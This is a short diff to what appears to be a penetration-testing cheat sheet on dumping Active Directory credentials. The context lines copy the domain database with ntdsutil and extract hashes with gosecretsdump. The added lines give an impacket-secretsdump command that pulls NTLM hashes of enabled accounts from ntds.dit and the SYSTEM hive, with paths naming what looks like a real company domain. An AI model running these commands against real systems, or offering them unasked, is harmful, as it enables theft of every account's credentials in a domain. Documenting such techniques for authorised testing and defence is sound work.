@@ -9,3 +9,8 @@ ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
 ```sh
 gosecretsdump -enabled -noprint  -ntds [ntds.dit] -system [SYSTEM] -out [ntlm.domain.txt]
 ```
+
+## [secretsdump](/Tools/impacket.md)
+```sh
+impacket-secretsdump -user-status -system ./corp.storebrand.no/registry/SYSTEM -ntds ./corp.storebrand.no/Active\ Directory/ntds.dit LOCAL | grep '(status=Enabled)' | sed 's/(status\=Enabled)//'
+```
